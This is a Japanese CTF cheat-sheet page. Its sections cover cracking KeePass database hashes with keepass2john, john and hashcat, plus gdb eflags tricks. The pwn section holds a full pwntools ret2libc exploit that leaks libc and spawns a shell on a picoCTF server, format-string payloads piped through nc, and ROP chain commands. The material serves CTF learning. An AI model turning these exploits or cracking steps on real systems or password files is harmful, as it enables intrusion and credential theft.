<h3 id="hashcat-オプションtips" style="position:relative;"><a href="#hashcat-%E3%82%AA%E3%83%97%E3%82%B7%E3%83%A7%E3%83%B3tips" aria-label="hashcat オプションtips permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Hashcat オプションTips</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># Workloadを3か4にする(4はかなり端末リソースを食う)</span>
-w <span class="token number">3</span>

<span class="token comment"># Attack Mode</span>
-a 
<span class="token operator">==</span><span class="token operator">=</span><span class="token operator">+=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token number">0</span> <span class="token operator">|</span> Straight
<span class="token number">3</span> <span class="token operator">|</span> Brute-force</code></pre></div>
<h3 id="keepass-database" style="position:relative;"><a href="#keepass-database" aria-label="keepass database permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>KeePass database</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ keepass2john MyPasswords.kdbx <span class="token operator">></span> dbhash.txt <span class="token comment"># DBNAME:$keepass$....</span>

<span class="token comment"># keepass2johnでKeyファイルを使用</span>
$ keepass2john MyPasswords.kdbx <span class="token operator">></span> dbhash.txt <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> keyfile <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> f<span class="token punctuation">;</span> <span class="token keyword">do</span> keepass2john -k <span class="token variable">$f</span> MyPasswords.kdbx <span class="token operator">>></span> dbhash.txt <span class="token punctuation">;</span> <span class="token keyword">done</span>

$ john dbhash.txt /usr/share/wordlists/rockyou.txt
$ hashcat -a <span class="token number">0</span> -m <span class="token number">13400</span> -w <span class="token number">4</span> dbhash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>
<h2 id="pwnのtips" style="position:relative;"><a href="#pwn%E3%81%AEtips" aria-label="pwnのtips permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>pwnのTips</h2>
<h3 id="プロセスにバイトコードを送り込む" style="position:relative;"><a href="#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%83%90%E3%82%A4%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E9%80%81%E3%82%8A%E8%BE%BC%E3%82%80" aria-label="プロセスにバイトコードを送り込む permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>プロセスにバイトコードを送り込む</h3>
<ul>
<li>スクリプト(Pwntool)</li>
</ul>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> time

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vuln"</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elf

puts_plt <span class="token operator">=</span> <span class="token number">0x400540</span>
got_plt_scanf <span class="token operator">=</span> <span class="token number">0x601038</span>
rop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400913</span>
ret <span class="token operator">=</span> <span class="token number">0x40052e</span>
main <span class="token operator">=</span> <span class="token number">0x400771</span>

<span class="token comment"># Local</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vuln"</span><span class="token punctuation">)</span>

<span class="token comment"># Remote</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"mercury.picoctf.net"</span><span class="token punctuation">,</span> <span class="token number">42072</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b""</span>
payload <span class="token operator">+=</span> <span class="token string">b"\x41"</span><span class="token operator">*</span><span class="token number">128</span>
payload <span class="token operator">+=</span> <span class="token string">b"\x42"</span><span class="token operator">*</span><span class="token number">8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_rdi_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>got_plt_scanf<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>

r <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

leakaddr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># print(hex(leakaddr))</span>

base_addr <span class="token operator">=</span> leakaddr <span class="token operator">-</span> <span class="token number">0x07bf30</span>
system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x04f4e0</span>
str_bin_sh <span class="token operator">=</span> base_addr <span class="token operator">+</span>  <span class="token number">0x1b40fa</span>

payload <span class="token operator">=</span> <span class="token string">b""</span>
payload <span class="token operator">+=</span> <span class="token string">b"\x41"</span><span class="token operator">*</span><span class="token number">128</span>
payload <span class="token operator">+=</span> <span class="token string">b"\x42"</span><span class="token operator">*</span><span class="token number">8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_rdi_ret<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>

r <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></div>
<ul>
<li>標準入出力を使う</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">'import sys; sys.stdout.buffer.write(b"A" * 16 +  b"\xce\xfa\xde\xc0")'</span>

<span class="token builtin class-name">echo</span> -e <span class="token string">'AAAAAAAAAAAAAAAA\xce\xfa\xde\xc0'</span></code></pre></div>
<ul>
<li>よく使う文字列</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</span>
<span class="token function">import</span> string
string.ascii_uppercase + string.ascii_lowercase + <span class="token string">"0123456789"</span></code></pre></div>
<h3 id="return-to-pltreturn-to-libc" style="position:relative;"><a href="#return-to-pltreturn-to-libc" aria-label="return to pltreturn to libc permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Return to PLT/Return to libc</h3>
<ul>
<li><code class="language-text">call</code>は、呼び出し時にリターンアドレスをスタックにpushしており、関数が終了する際に呼び出される<code class="language-text">ret</code>は、スタックに積まれたリターンアドレスをpopしてEIPレジスタに書き込むことで呼び出し元に戻ることができる。</li>
<li><code class="language-text">call</code>は呼び出し時にリターンアドレスとrbpを順にスタックに積む。つまり、ローカルスタックの最上位スタックにはリターンアドレスが格納されている。</li>
<li>つまり、64bitELFの場合は基本的にはRBPレジスタ+0x8のアドレスにリターンアドレスが格納されているため、スタックを操作できる場合はこのアドレスの値を任意に書き換えることで戻り先を指定することが可能になる。</li>
<li>そのため、BOFを悪用する場合、入力値の先頭バイトが格納されるアドレスとRBPの値を取得することで、<code class="language-text">$RBP+0x8-&lt;入力値格納先></code>の計算で比較的スマートにRIPの改ざんまでに必要なバイトサイズを特定することができる。</li>
<li>systemを呼び出す際にASLRでアドレスが変わる場合は、victim側のprintやputなどのアドレスをリークし、相対位置で実行時のsystemのアドレスを参照する必要がある。</li>
<li>Return to PLT：バイナリで使用される関数のプロセスリンケージテーブルエントリにジャンプし、それを使用してGOTポインタをリークし、libcバージョンを予測する</li>
<li>
<p>Return to libc：system()などのアドレスに直接ジャンプする</p>
<ul>
<li>典型的なret2libcの場合は、まずlibcのアドレスをリークさせる</li>
<li>リークさせたアドレスと<a href="https://libc.blukat.me/" target="_blank" rel="nofollow noopener noreferrer">libc database search</a>を使って、libcのベースアドレスを特定する</li>
<li>ベースアドレスとの相対位置から<code class="language-text">/bin/sh</code>のアドレスを特定し、以下のようなスタック構成でシェルを取得できる</li>
</ul>
<table>
<thead>
<tr>
<th align="center">スタック</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">ret</td>
</tr>
<tr>
<td align="center">pop rdi; ret</td>
</tr>
<tr>
<td align="center"><code class="language-text">/bin/sh</code></td>
</tr>
<tr>
<td align="center">system()</td>
</tr>
</tbody>
</table>
</li>
<li>systemのアドレスを使用してもシェルが取れない場合は、アラインメントでセグメント違反が出ていないかを確認してみる</li>
<li>PLTを探索する</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ objdump -d -M intel -j .plt ./myapp

<span class="token comment"># peda</span>
$ plt</code></pre></div>
<h3 id="書式文字攻撃サンプル" style="position:relative;"><a href="#%E6%9B%B8%E5%BC%8F%E6%96%87%E5%AD%97%E6%94%BB%E6%92%83%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB" aria-label="書式文字攻撃サンプル permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>書式文字攻撃サンプル</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">// スタックの中身を表示
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x

// <span class="token number">10</span>番目の値を表示
AAAA%10<span class="token variable">$08x</span>

// netcatで書式文字攻撃
python3 -c <span class="token string">'print("1\n" + "%p." * 50)'</span> <span class="token operator">|</span> <span class="token function">nc</span> mercury.picoctf.net <span class="token number">20195</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">"."</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token variable">$line</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> strings -n1 <span class="token operator">|</span> <span class="token function">rev</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">"<span class="token entity" title="\n">\n</span>"</span></code></pre></div>
<h3 id="ropサンプル" style="position:relative;"><a href="#rop%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB" aria-label="ropサンプル permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ROPサンプル</h3>
<ul>
<li>ガジェットの探索</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ ropper --file app
$ ROPgadget --binary app</code></pre></div>
<ul>
<li>pwntoolsのROPをロードする</li>
</ul>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./app"</span><span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>elf<span class="token punctuation">)</span></code></pre></div>
<ul>
<li>ROPに使える機械語の対応</li>
</ul>
<table>
<thead>
<tr>
<th align="center">x86_64</th>
<th align="center">pop rdi;</th>
<th align="center">0x5f</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody>
</table>
<ul>
<li>ROP Chainの構築</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ ROPgadget --binary myapp --ropchain</code></pre></div>
<p>参考：<a href="https://hackmd.io/@Xornet/BJh5RikpU" target="_blank" rel="nofollow noopener noreferrer">HSCTF 6 - Combo Chain - HackMD</a></p>
<h3 id="got-overwriteサンプル" style="position:relative;"><a href="#got-overwrite%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB" aria-label="got overwriteサンプル permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>GOT Overwriteサンプル</h3>
<p>※ 工事中</p>
<h3 id="glibリンカのバージョン問題" style="position:relative;"><a href="#glib%E3%83%AA%E3%83%B3%E3%82%AB%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E5%95%8F%E9%A1%8C" aria-label="glibリンカのバージョン問題 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>glib、リンカのバージョン問題</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># ライブラリファイルが与えられている場合</span>
<span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span> ./chall
<span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>./libc.so.6 ./chall

<span class="token comment"># patchelfとpwninitをダウンロードしておく</span>
pwninit</code></pre></div>
<h3 id="ローカルでバイナリをxintedする" style="position:relative;"><a href="#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%81%A7%E3%83%90%E3%82%A4%E3%83%8A%E3%83%AA%E3%82%92xinted%E3%81%99%E3%82%8B" aria-label="ローカルでバイナリをxintedする permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>ローカルでバイナリをxintedする</h3>
<ul>
<li>/etc/serviceを設定する</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># Local services</span>
app             <span class="token number">10080</span>/tcp</code></pre></div>
<ul>
<li>/etc/xinetd.d/myapp を作成して、アプリケーションのパスを指定する</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/xinetd.d/myapp 
<span class="token function">service</span> app
<span class="token punctuation">{</span>
        disable         <span class="token operator">=</span> no
        socket_type     <span class="token operator">=</span> stream
        <span class="token function">wait</span>            <span class="token operator">=</span> no
        user            <span class="token operator">=</span> kali
        server          <span class="token operator">=</span> /home/kali/Downloads/app
        log_on_failure  <span class="token operator">+=</span> USERID
<span class="token punctuation">}</span></code></pre></div>
<ul>
<li>サービスを起動して接続確認</li>
</ul>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> xinetd start
<span class="token function">nc</span> localhost <span class="token number">10080</span></code></pre></div>
<h3 id="heap-exploit" style="position:relative;"><a href="#heap-exploit" aria-label="heap exploit permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Heap Exploit</h3>
<ul>
<li><a href="/ctf-learning-heap">よちよちCTFerがHeap完全に理解したになるまでのメモ</a></li>
</ul>
<h3 id="pwn参考記事" style="position:relative;"><a href="#pwn%E5%8F%82%E8%80%83%E8%A8%98%E4%BA%8B" aria-label="pwn参考記事 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Pwn参考記事</h3>
<ul>
<li><a href="https://hackmd.io/@xk4KNXQvTxu07bQ0WJ7FUQ/rJTiw9Ww4?type=view" target="_blank" rel="nofollow noopener noreferrer">Pwn 入門編 - HackMD</a></li>
</ul>
<h2 id="gdbのtips" style="position:relative;"><a href="#gdb%E3%81%AEtips" aria-label="gdbのtips permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>gdbのTips</h2>
<h3 id="フラグ置き換え方法" style="position:relative;"><a href="#%E3%83%95%E3%83%A9%E3%82%B0%E7%BD%AE%E3%81%8D%E6%8F%9B%E3%81%88%E6%96%B9%E6%B3%95" aria-label="フラグ置き換え方法 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>フラグ置き換え方法</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># Toggle Flag</span>
info registers eflags
<span class="token builtin class-name">set</span> <span class="token variable">$CF</span> <span class="token operator">=</span> <span class="token number">0</span>
<span class="token builtin class-name">set</span> <span class="token variable">$PF</span> <span class="token operator">=</span> <span class="token number">2</span>
<span class="token builtin class-name">set</span> <span class="token variable">$ZF</span> <span class="token operator">=</span> <span class="token number">6</span>
<span class="token builtin class-name">set</span> <span class="token variable">$SF</span> <span class="token operator">=</span> <span class="token number">7</span>

<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> ^<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token variable">$SF</span><span class="token punctuation">)</span>
<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> ^<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token variable">$ZF</span><span class="token punctuation">)</span>
<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> ^<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token variable">$CF</span><span class="token punctuation">)</span>

<span class="token comment"># Set flag</span>
eflags <span class="token punctuation">[</span> IF <span class="token punctuation">]</span>
<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> <span class="token operator">=</span> 0x42

eflags <span class="token punctuation">[</span> IF <span class="token punctuation">]</span> 
<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> <span class="token operator">=</span> <span class="token number">0</span>

eflags <span class="token punctuation">[</span> CF PF AF ZF SF TF IF DF OF NT RF AC <span class="token punctuation">]</span> 
<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> <span class="token operator">=</span> 0xFFFFF

<span class="token comment">## Clear Flag</span>
<span class="token builtin class-name">set</span> <span class="token variable">$eflags</span> <span class="token operator">&amp;</span><span class="token operator">=</span> ~<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token variable">$ZF</span><span class="token punctuation">)</span></code></pre></div>
<h3 id="条件ジャンプ命令メモ" style="position:relative;"><a href="#%E6%9D%A1%E4%BB%B6%E3%82%B8%E3%83%A3%E3%83%B3%E3%83%97%E5%91%BD%E4%BB%A4%E3%83%A1%E3%83%A2" aria-label="条件ジャンプ命令メモ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>条件ジャンプ命令メモ</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">命令	ジャンプ条件
JA	より上（CF <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">&amp;</span> ZF <span class="token operator">=</span> <span class="token number">0</span>）  <span class="token number">77</span>
JAE	より上か等しい（CF <span class="token operator">=</span> <span class="token number">0</span>）
JB	より下（CF <span class="token operator">=</span> <span class="token number">1</span>）  <span class="token number">72</span>
JBE	より下か等しい（CF <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">|</span> ZF <span class="token operator">=</span> <span class="token number">1</span>）
